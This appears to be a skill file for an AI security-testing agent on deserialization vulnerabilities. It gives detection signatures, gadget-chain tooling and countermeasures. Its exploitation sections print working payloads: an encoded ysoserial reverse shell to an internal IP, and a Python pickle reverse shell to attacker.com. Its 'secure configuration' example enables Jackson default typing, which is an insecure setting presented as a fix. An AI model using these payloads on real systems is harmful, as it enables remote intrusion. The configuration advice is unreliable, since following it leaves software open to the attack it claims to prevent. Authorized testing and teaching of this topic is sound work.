---
name: deserialization-testing
description: Professional techniques and methodology for deserialization vulnerability testing
version: 1.0.0
---

# Deserialization Vulnerability Testing

## Overview

Deserialization vulnerabilities arise when an application deserializes untrusted data, potentially leading to remote code execution, denial of service, and more. This skill covers how to detect, exploit, and prevent deserialization vulnerabilities.

## How the Vulnerability Works

When an application deserializes serialized data into objects and the data is untrusted, an attacker can craft malicious serialized payloads that execute arbitrary code during deserialization.

## Common Formats

### Java

**Common libraries:**
- Java native serialization
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**Common functions:**
- unserialize()
- json_decode()

### Python

**Common modules:**
- pickle
- yaml
- json

### .NET

**Common classes:**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## Testing Method

### 1. Identify Serialized Data

**Java serialization signatures:**
```
AC ED 00 05 (hex)
rO0 (Base64)
```

**PHP serialization signatures:**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**Python pickle signatures:**
```
\x80\x03
```

### 2. Locate Deserialization Points

**Common locations:**
- Cookie values
- Session data
- API parameters
- File uploads
- Cached data
- Message queues

### 3. Java Deserialization

**Apache Commons Collections exploitation:**
```java
// Generate a payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**Common gadget chains:**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. PHP Deserialization

**Basic test:**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**Magic method exploitation:**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python Pickle

**Basic test:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## Exploitation Techniques

### Java RCE

**Using ysoserial:**
```bash
# Generate a payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Base64-encode it
base64 -w 0 payload.bin
```

**Manual construction:**
```java
// Build a malicious object with a gadget chain
// See the ysoserial source
```

### PHP RCE

**POP chain exploitation:**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### Python RCE

**Pickle RCE:**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## Bypass Techniques

### Encoding Bypass

**Base64 encoding:**
```
Raw: rO0ABXNy...
Encoded: ck8wQUJYTnk...
```

**URL encoding:**
```
%72%4F%00%AB...
```

### Filter Bypass

**Use different gadget chains:**
- If CommonsCollections is filtered, try Spring
- If one version is filtered, try another

### Class Name Obfuscation

**Using reflection:**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## Tooling

### ysoserial

```bash
# List available gadgets
java -jar ysoserial.jar

# Generate a payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# Base64 output
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# List available gadgets
./phpggc -l

# Generate a payload
./phpggc Monolog/RCE1 system id

# Generate an encoded payload
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. Intercept a request containing serialized data
2. Generate a payload with a plugin
3. Replace the original data
4. Observe the response

## Verification and Reporting

### Verification Steps

1. Confirm the serialized data is controllable
2. Verify that deserialization triggers code execution
3. Assess impact (RCE, data exposure, etc.)
4. Record a complete PoC
5. Record the confirmed vulnerability in the platform via the `report_finding` tool (the sole entry point for recording findings in this platform), covering location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting Essentials

- Vulnerability location and serialization data format
- Gadget chain or exploitation technique used
- Complete exploitation steps and PoC
- Remediation advice (input validation, safe serialization, etc.)

## Countermeasures

### Recommended Approaches

1. **Avoid deserializing untrusted data**
   - Prefer JSON
   - Use a safe serialization format

2. **Input validation**
   ```java
   // Whitelist class names
   private static final Set<String> ALLOWED_CLASSES = 
       Set.of("com.example.SafeClass");
   
   private Object readObject(ObjectInputStream ois) {
       // Validate the class name
       // ...
   }
   ```

3. **Secure configuration**
   ```java
   // Jackson configuration
   objectMapper.enableDefaultTyping();
   objectMapper.setVisibility(PropertyAccessor.FIELD, 
       JsonAutoDetect.Visibility.ANY);
   ```

4. **ClassLoader isolation**
   - Use a custom ClassLoader
   - Restrict loadable classes

5. **Monitoring and logging**
   - Log deserialization operations
   - Monitor for anomalous behavior

## Notes

- Test only in authorized environments
- Gadget chains differ across library versions
- Watch payload size limits when testing
- Know the target application's dependency versions
